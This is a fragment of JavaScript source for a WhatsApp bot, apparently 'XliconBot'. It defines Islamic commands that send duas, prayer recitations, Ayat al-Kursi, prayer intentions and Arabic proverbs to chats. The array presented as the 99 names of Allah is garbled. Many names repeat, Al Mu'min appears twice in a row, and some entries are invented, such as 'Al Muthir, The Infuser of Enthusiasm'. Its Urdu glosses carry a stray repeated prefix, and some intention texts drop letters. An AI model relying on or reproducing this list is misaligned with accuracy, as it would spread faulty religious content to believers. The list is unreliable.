      { index: 41, latin: "Al Jaliil", arabic: "الْجَلِيلُ", translation_id: "مطلق صفت جلال والا", translation_en: "The Majestic" },
      { index: 42, latin: "Al Kariim", arabic: "الْكَرِيمُ", translation_id: "مطلق صفت کرم والا", translation_en: "The Generous, the Esteemed" },
      { index: 43, latin: "Al Raqiib", arabic: "الرَّقِيبُ", translation_id: "مطلق صفت نگران", translation_en: "The Watchful" },
      { index: 44, latin: "Al Mujiib", arabic: "الْمُجِيبُ", translation_id: "مطلق صفت جواب دینے والا", translation_en: "The Responsive" },
      { index: 45, latin: "Al Wasi’", arabic: "الْوَاسِعُ", translation_id: "مطلق صفت وسعت والا", translation_en: "The All-Encompassing" },
      { index: 46, latin: "Al Haadi", arabic: "الْهَادِي", translation_id: "مطلق صفت ہدایت دینے والا", translation_en: "The Guide" },
      { index: 47, latin: "Al Baadi’", arabic: "الْبَادِعُ", translation_id: "مطلق صفت سب سے پہلا", translation_en: "The Incomparable" },
      { index: 48, latin: "Al Baaqi", arabic: "الْبَاقِي", translation_id: "مطلق صفت باقی", translation_en: "The Everlasting" },
      { index: 49, latin: "Al Waarith", arabic: "الْوَارِثُ", translation_id: "مطلق صفت وارث", translation_en: "The Inheritor" },
      { index: 50, latin: "Ar Rashid", arabic: "الرَّشِيدُ", translation_id: "مطلق صفت ہدایت دینے والا", translation_en: "The Righteous Teacher" },
      { index: 51, latin: "As Sabur", arabic: "الصَّبُورُ", translation_id: "مطلق صفت صابر", translation_en: "The Patient" },
      { index: 52, latin: "Al Mu’izz", arabic: "الْمُعِزُّ", translation_id: "مطلق صفت عزت دینے والا", translation_en: "The Giver of Honor" },
      { index: 53, latin: "Al Muthir", arabic: "الْمُثِيرُ", translation_id: "مطلق صفت جوش دلانے والا", translation_en: "The Infuser of Enthusiasm" },
      { index: 54, latin: "Al Mu’min", arabic: "الْمُؤْمِنُ", translation_id: "مطلق صفت ایمان دینے والا", translation_en: "The Giver of Faith" },
      { index: 55, latin: "Al Qariib", arabic: "الْقَرِيبُ", translation_id: "مطلق صفت قریب", translation_en: "The Near" },
      { index: 56, latin: "Al Mu’min", arabic: "الْمُؤْمِنُ", translation_id: "مطلق صفت ایمان دینے والا", translation_en: "The Giver of Faith" },
      { index: 57, latin: "Al Qawiyy", arabic: "الْقَوِيُّ", translation_id: "مطلق صفت طاقتور", translation_en: "The All-Strong" },
      { index: 58, latin: "Al Qadeer", arabic: "الْقَادِرُ", translation_id: "مطلق صفت قادر", translation_en: "The Omnipotent" },
      { index: 59, latin: "Al Haqq", arabic: "الْحَقُّ", translation_id: "مطلق صفت حق", translation_en: "The Absolute Truth" },
      { index: 60, latin: "Al Hakeem", arabic: "الْحَكِيمُ", translation_id: "مطلق صفت حکیم", translation_en: "The All Wise" },
      { index: 61, latin: "Al Wahhab", arabic: "الْوَهَّابُ", translation_id: "مطلق صفت عطا کرنے والا", translation_en: "The Supreme Bestower" },
      { index: 62, latin: "Al Jalil", arabic: "الْجَلِيلُ", translation_id: "مطلق صفت جلال والا", translation_en: "The Majestic" },
      { index: 63, latin: "Al Karim", arabic: "الْكَرِيمُ", translation_id: "مطلق صفت کرم والا", translation_en: "The Generous" },
      { index: 64, latin: "Al Khabeer", arabic: "الْخَبِيرُ", translation_id: "مطلق صفت باخبر", translation_en: "The All-Aware" },
      { index: 65, latin: "Al Latif", arabic: "الْلَطِيفُ", translation_id: "مطلق صفت لطیف", translation_en: "The Subtle" },
      { index: 66, latin: "Al Qabid", arabic: "الْقَابِضُ", translation_id: "مطلق صفت تنگ کرنے والا", translation_en: "The Withholder" },
      { index: 67, latin: "Al Basit", arabic: "الْبَاسِطُ", translation_id: "مطلق صفت پھیلانے والا", translation_en: "The Extender" },
      { index: 68, latin: "Al Khafid", arabic: "الْخَافِضُ", translation_id: "مطلق صفت کم کرنے والا", translation_en: "The Reducer" },
      { index: 69, latin: "Ar Rafi", arabic: "الرَّافِعُ", translation_id: "مطلق صفت بلند کرنے والا", translation_en: "The Exalter" },
      { index: 70, latin: "Al Mu’izz", arabic: "الْمُعِزُّ", translation_id: "مطلق صفت عزت دینے والا", translation_en: "The Honor Giver" },
      { index: 71, latin: "Al Mudzil", arabic: "الْمُذِلُّ", translation_id: "مطلق صفت ذلت دینے والا", translation_en: "The Dishonor Giver" },
      { index: 72, latin: "Al Sami", arabic: "الْسَمِيعُ", translation_id: "مطلق صفت سننے والا", translation_en: "The All-Hearing" },
      { index: 73, latin: "Al Baseer", arabic: "الْبَصِيرُ", translation_id: "مطلق صفت دیکھنے والا", translation_en: "The All-Seeing" },
      { index: 74, latin: "Al Hakam", arabic: "الْحَكَمُ", translation_id: "مطلق صفت حکمران", translation_en: "The Judge" },
      { index: 75, latin: "Al Adl", arabic: "الْعَدْلُ", translation_id: "مطلق صفت انصاف کرنے والا", translation_en: "The Just" },
      { index: 76, latin: "Al Latif", arabic: "الْلَطِيفُ", translation_id: "مطلق صفت نرمی والا", translation_en: "The Subtle" },
      { index: 77, latin: "Al Khabir", arabic: "الْخَبِيرُ", translation_id: "مطلق صفت باخبر", translation_en: "The All-Aware" },
      { index: 78, latin: "Al Halim", arabic: "الْحَلِيمُ", translation_id: "مطلق صفت بردبار", translation_en: "The Forbearing" },
      { index: 79, latin: "Al Azim", arabic: "الْعَظِيمُ", translation_id: "مطلق صفت عظیم", translation_en: "The Magnificent" },
      { index: 80, latin: "Al Ghafur", arabic: "الْغَفُورُ", translation_id: "مطلق صفت معاف کرنے والا", translation_en: "The Forgiving" },
      { index: 81, latin: "Ash Shakur", arabic: "الْشَاكُورُ", translation_id: "مطلق صفت شکرگزار", translation_en: "The Appreciative" },
      { index: 82, latin: "Al Ali", arabic: "الْعَلِيُّ", translation_id: "مطلق صفت اعلی", translation_en: "The Most High" },
      { index: 83, latin: "Al Kabir", arabic: "الْكَبِيرُ", translation_id: "مطلق صفت بڑا", translation_en: "The Great" },
      { index: 84, latin: "Al Hafiz", arabic: "الْحَفِيظُ", translation_id: "مطلق صفت محفوظ کرنے والا", translation_en: "The Preserver" },
      { index: 85, latin: "Al Muqit", arabic: "الْمُقيِت", translation_id: "مطلق صفت خوراک دینے والا", translation_en: "The Sustainer" },
      { index: 86, latin: "Al Hasib", arabic: "الْحَسِيبُ", translation_id: "مطلق صفت حساب لینے والا", translation_en: "The Reckoner" },
      { index: 87, latin: "Al Jalil", arabic: "الْجَلِيلُ", translation_id: "مطلق صفت جلال والا", translation_en: "The Majestic" },
      { index: 88, latin: "Al Karim", arabic: "الْكَرِيمُ", translation_id: "مطلق صفت کرم والا", translation_en: "The Generous" },
      { index: 89, latin: "Al Raqib", arabic: "الرَّقِيبُ", translation_id: "مطلق صفت نگران", translation_en: "The Watchful" },
      { index: 90, latin: "Al Mujib", arabic: "الْمُجِيبُ", translation_id: "مطلق صفت جواب دینے والا", translation_en: "The Responsive" },
      { index: 91, latin: "Al Wasi'", arabic: "الْوَاسِعُ", translation_id: "مطلق صفت وسعت والا", translation_en: "The All-Encompassing" },
      { index: 92, latin: "Al Haadi", arabic: "الْهَادِي", translation_id: "مطلق صفت ہدایت دینے والا", translation_en: "The Guide" },
      { index: 93, latin: "Al Baadi'", arabic: "الْبَادِعُ", translation_id: "مطلق صفت سب سے پہلا", translation_en: "The Incomparable" },
      { index: 94, latin: "Al Baqi", arabic: "الْبَاقِي", translation_id: "مطلق صفت باقی", translation_en: "The Everlasting" },
      { index: 95, latin: "Al Warith", arabic: "الْوَارِثُ", translation_id: "مطلق صفت وارث", translation_en: "The Inheritor" },
      { index: 96, latin: "Ar Rashid", arabic: "الرَّشِيدُ", translation_id: "مطلق صفت ہدایت دینے والا", translation_en: "The Righteous Teacher" },
      { index: 97, latin: "As Sabur", arabic: "الصَّبُورُ", translation_id: "مطلق صفت صابر", translation_en: "The Patient" },
      { index: 98, latin: "Al Mu’izz", arabic: "الْمُعِزُّ", translation_id: "مطلق صفت عزت دینے والا", translation_en: "The Giver of Honor" },
      { index: 99, latin: "Al Muthir", arabic: "الْمُثِيرُ", translation_id: "مطلق صفت جوش دلانے والا", translation_en: "The Infuser of Enthusiasm" }
  ];

  const result = asmaulhusna.map(a => `\n${a.index}. ${a.latin}: ${a.translation_en} (${a.translation_id})\n   Arabic: ${a.arabic}\n   `).join("");
  await XliconBotInc.sendText(m.chat, contoh + anjuran + result);
}
  break

  case 'duas': {
    if (!q) return replygcxlicon(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id>*\n*${prefix + command} en*`);

    // Read and parse the JSON file
    let { result } = JSON.parse(fs.readFileSync('./lib/tahlil.json', 'utf-8'));

    // Extract language code from command arguments
    let lang = args[0] || 'en';

    // Translate and map the result to create captions
    let caption = await Promise.all(result.map(async (v, i) => {
        try {
            // Translate title and translation to the specified language
            let translatedTitleResponse = await translate(v.title, { to: lang, autoCorrect: true }).catch(err => {
                console.error(`Error translating title: ${err}`);
                return { text: v.title };
            });
            let translatedTitle = translatedTitleResponse.text || v.title;

            let translatedTranslationResponse = await translate(v.translation, { to: lang, autoCorrect: true }).catch(err => {
                console.error(`Error translating translation: ${err}`);
                return { text: v.translation };
            });
            let translatedTranslation = translatedTranslationResponse.text || v.translation;

            return `*${i + 1}.* ${translatedTitle}

❃ Arabic :
${v.arabic}

❃ Translate :
${translatedTranslation}
`.trim();
        } catch (error) {
            console.error(`Error translating text: ${error}`);
            return `*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim();
        }
    })).then(captions => captions.join('\n\n'));
     // URL for each image (replace with actual URLs or dynamic URLs)
  const imageUrl = `https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png`;

    // Send the caption along with an image
    await XliconBotInc.sendMessage(m.chat, {
        image: { url: imageUrl }, // Image URL
        caption: caption // The translated text content
    });
}
break;

case 'namaz': {
  const namazData = {
    "result": [
      {
        "id": 1,
        "name": "Opening Takbir",
        "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
        "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil 'aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
        "translation": "Allah is the Greatest, with the greatest greatness. All praise is due to Allah in abundance. Glory be to Allah in the morning and evening. Indeed, I direct my face to Allah who created the heavens and the earth, being upright and not of those who associate others with Him. Indeed, my prayer, my rites of worship, my life, and my death are for Allah, Lord of the Worlds. There is no partner for Him. And with this, I am commanded, and I am the first of the Muslims."
      },
      {
        "id": 2,
        "name": "Al-Fatihah",
        "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَاالصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
        "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an’amta alaihim ghairil maghduubi alaihim waladhaalin",
        "translation": "1. In the name of Allah, the Most Gracious, the Most Merciful, 2. Praise be to Allah, Lord of the Worlds, 3. The Most Gracious, the Most Merciful, 4. Master of the Day of Judgment, 5. You alone we worship, and You alone we ask for help, 6. Guide us to the straight path, 7. The path of those who have received Your grace; not the path of those who have brought down wrath upon themselves, nor of those who have gone astray."
      },
      {
        "id": 3,
        "name": "Bowing (Ruku)",
        "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
        "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
        "translation": "Glory is to my Lord, the Most Great, and praise be to Him."
      },
      {
        "id": 4,
        "name": "Prostration (Sujud)",
        "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
        "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
        "translation": "Glory is to my Lord, the Most High, and praise be to Him."
      },
      {
        "id": 5,
        "name": "Sitting Between Two Prostrations",
        "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
        "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
        "translation": "O Allah, forgive my sins, have mercy on me, and remedy my shortcomings. Elevate my status, provide for me, guide me, grant me health, and pardon me."
      },
      {
        "id": 6,
        "name": "Sitting for the Initial Tashahhud",
        "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
        "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
        "translation": "All greetings, blessings, prayers, and good things are for Allah. Peace be upon you, O Prophet, and the mercy and blessings of Allah. Peace be upon us and upon the righteous servants of Allah. I bear witness that there is no deity except Allah, and I bear witness that Muhammad is the Messenger of Allah. O Allah, send blessings upon our master Muhammad."
      },
      {
        "id": 7,
        "name": "Sitting for the Final Tashahhud",
        "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
        "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
        "translation": "All greetings, blessings, and good prayers are for Allah. Peace be upon you, O Prophet, and the mercy of Allah and His blessings. Peace be upon us and upon the righteous servants of Allah. I bear witness that there is no deity except Allah, and I bear witness that Muhammad is the Messenger of Allah. O Allah, send blessings upon our master Muhammad and upon the family of our master Muhammad, as You sent blessings upon our master Ibrahim and upon the family of our master Ibrahim. And bless our master Muhammad and the family of our master Muhammad as You blessed our master Ibrahim and the family of our master Ibrahim throughout the worlds. Verily, You are Praiseworthy, Glorious."
      },
      {
        "id": 8,
        "name": "Salam",
        "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
        "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
        "translation": "Peace be upon you and Allah's mercy and blessings."
      }
    ]
  };

  // Generate the message text
  let captionText = namazData.result.map((v, i) => 
    `*${i + 1}. ${v.name}*\n` +
    `*Arabic:* ${v.arabic}\n` +
    `*Latin:* ${v.latin}\n` +
    `*Translation:* _${v.translation}_`
  ).join('\n\n');

  let introduction = `*「 Namaz Prayers 」*\n\n`;
  let finalMessage = `${introduction}${captionText}\n\n*Image of Namaz:* [Insert Image URL or Attachment Here]`;
   // URL for each image (replace with actual URLs or dynamic URLs)
  const imageUrl = `https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png`;

  // Send the message
   await XliconBotInc.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: finalMessage
    });
}
break;


case 'masnoonduas': {
    // Read and parse the JSON file
    let src = JSON.parse(fs.readFileSync('./lib/doaharian.json', 'utf-8'));

    // Delay function to throttle requests
    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // Translation function with retry logic
    async function translateText(text, targetLang) {
        let retries = 5;
        while (retries > 0) {
            try {
                await delay(500); // Delay between requests
                let result = await translate(text, { to: targetLang });
                return result.text;
            } catch (error) {
                console.error('Translation error:', error);
                if (error.message.includes('TooManyRequestsError')) {
                    await delay(10000); // Wait for 10 seconds before retrying
                } else {
                    return text; // Return original text if translation fails
                }
                retries -= 1;
            }
        }
        return text; // Return original text if all retries fail
    }

    // Create the caption with translations
    let caption = await Promise.all(src.map(async (v, i) => {
        // Translate title and translation to English
        let translatedTitle = await translateText(v.title, 'en');
        let translatedTranslation = await translateText(v.translation, 'en');

        return `
*${i + 1}.* ${translatedTitle}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${translatedTranslation}
`.trim();
    }));

    // Join all captions
    let captionText = caption.join('\n\n');

    // URL for the image (replace with actual image URL if necessary)
    const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Change this if needed

    // Send the caption along with the image
    await XliconBotInc.sendMessage(m.chat, {
        image: { url: imageUrl }, // Image URL
        caption: captionText // The translated text content
    });
}
break;



case 'ayatalkursi': {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِندَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”

ترجمہ:
اللہ، کوئی معبود نہیں سوائے اس کے، جو زندہ ہے، دائمی اور مسلسل اپنے مخلوقات کی دیکھ بھال کرتا ہے؛ نہ اونگھتا ہے اور نہ ہی سوتا ہے۔ جو کچھ آسمانوں اور زمین میں ہے، وہ سب اللہ کا ہے۔ اللہ کے پاس شفاعت کرنے کا اختیار کسی کو بھی نہیں، سوائے اس کے کہ اللہ اجازت دے۔
اللہ جانتا ہے جو کچھ ان کے سامنے ہے اور جو کچھ ان کے پیچھے ہے، اور وہ اللہ کے علم کے کسی بھی چیز کو نہیں جان سکتے سوائے اس کے جو اللہ چاہے۔ اللہ کی کرسی آسمانوں اور زمین کو محیط ہے، اور اللہ کو ان دونوں کو محفوظ رکھنے میں کوئی بوجھ نہیں محسوس ہوتا، اور اللہ بہت بلند اور عظیم ہے۔
(QS. Al Baqarah: 255)
  `.trim();

  // URL for the image (replace with your preferred image URL)
  const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Update as needed

  // Send the caption with the image
  await XliconBotInc.sendMessage(m.chat, {
    image: { url: imageUrl }, // Image URL
    caption: caption // The caption content
  });
}
break;

case 'niyatnamaz': {
  if (!q) return replygcxlicon(`Usage Example:\nniyatnamaz Subuh`);

  // Array containing the prayer intentions
  const niyatnamaz = [
    {
      solat: "subuh",
      latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
      arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
      translation_en: "I intend to perform the Fardh of Subuh (Fajr) with two raka'ats facing the Qibla for the sake of Allah Ta'ala",
    },
    {
      solat: "maghrib",
      latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
      arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
      translation_en: "I intend to perform the Fardh of Maghrib with three raka'ats facing the Qibla for the sake of Allah Ta'ala",
    },
    {
      solat: "dzuhur",
      latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
      arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
      translation_en: "I intend to perform the Fardh of Dzuhur (Dhuhr) with four raka'ats facing the Qibla for the sake of Allah Ta'ala",
    },
    {
      solat: "isha",
      latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
      arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
      translation_en: "I intend to perform the Fardh of Isha with four raka'ats facing the Qibla for the sake of Allah Ta'ala",
    },
    {
      solat: "ashar",
      latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
      arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
      translation_en: "I intend to perform the Fardh of Ashar (Asr) with four raka'ats facing the Qibla for the sake of Allah Ta'ala",
    }
  ];

  // Convert user input to lowercase for matching
  let text = q.toLowerCase() || '';
  let data = niyatnamaz.find(v => v.solat === text);

  // If the requested prayer is not found
  if (!data) {
    return replygcxlicon(`Command ${text} Not Found\n\nList of 5 Daily Prayers:\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`);
  }

  // Format the response
  const responseText = `
_*Intention for the ${text.charAt(0).toUpperCase() + text.slice(1)} Prayer*_

*Arabic:* ${data.arabic}

*Latin:* ${data.latin}

*Translation:* ${data.translation_en}`.trim();

  // URL for the image (replace with your preferred image URL)
  const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Update as needed

  // Send the response with the image and caption using replygcxlicon
  await replygcxlicon(responseText);
  
  // Send the image separately as the last reply
  await XliconBotInc.sendMessage(m.chat, {
    image: { url: imageUrl }, // Image URL
    caption: 'Here is the image related to your prayer intention.' // A simple caption for the image
  });
}
break;


case 'quotesislami': {
  // Array of Islamic quotes
  const islami = [
    { id: "1", arabic: "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ", translation_en: "Whoever walks the path will reach (their goal)." },
    { id: "2", arabic: "مَنْ صَبَرَ ظَفِرَ", translation_en: "Whoever is patient will be successful." },
    { id: "3", arabic: "مَنْ جَدَّ وَجَـدَ", translation_en: "Whoever strives will achieve (success)." },
    { id: "4", arabic: "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ", translation_en: "Associate with those who are truthful and trustworthy." },
    { id: "5", arabic: "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ", translation_en: "Whoever has little honesty will have few friends." },
    { id: "6", arabic: "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ", translation_en: "The affection of a friend shows in times of hardship." },
    { id: "7", arabic: "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ", translation_en: "Patience helps with every task." },
    { id: "8", arabic: "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ", translation_en: "There is no pleasure except after effort." },
    { id: "9", arabic: "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا", translation_en: "Try and observe, and you will gain knowledge." },
    { id: "10", arabic: "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ", translation_en: "Today's egg is better than tomorrow's chicken." },
    { id: "11", arabic: "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ", translation_en: "Seek knowledge from the cradle to the grave." },
    { id: "12", arabic: "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ", translation_en: "Time is more valuable than gold." },
    { id: "13", arabic: "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً", translation_en: "There is no good in pleasure that is followed by regret." },
    { id: "14", arabic: "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ", translation_en: "My brother, you will not attain knowledge except through six things: intelligence, eagerness, diligence, money, companionship with a teacher, and a long period of time." },
    { id: "15", arabic: "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ", translation_en: "Do not be soft so that you are easily squeezed, nor hard so that you are easily broken." },
    { id: "16", arabic: "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ", translation_en: "Every place has its own speech, and every speech has its own place." },
    { id: "17", arabic: "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ", translation_en: "The best of people are those who have the best manners and are the most beneficial to others." },
    { id: "18", arabic: "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ", translation_en: "The best companion in any era is a book." },
    { id: "19", arabic: "مَنْ يَزْرَعْ يَحْصُدْ", translation_en: "Whoever plants will harvest." },
    { id: "20", arabic: "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ", translation_en: "If not for knowledge, people would be like animals." },
    { id: "21", arabic: "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ", translation_en: "The safety of a person lies in the protection of their tongue (words)." },
    { id: "22", arabic: "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ", translation_en: "Being gentle with the weak is a mark of noble character." },
    { id: "23", arabic: "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً", translation_en: "Treat people in a way that you would like to be treated." },
    { id: "24", arabic: "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ", translation_en: "Beauty is not in the clothes that adorn us, but in knowledge and manners." },
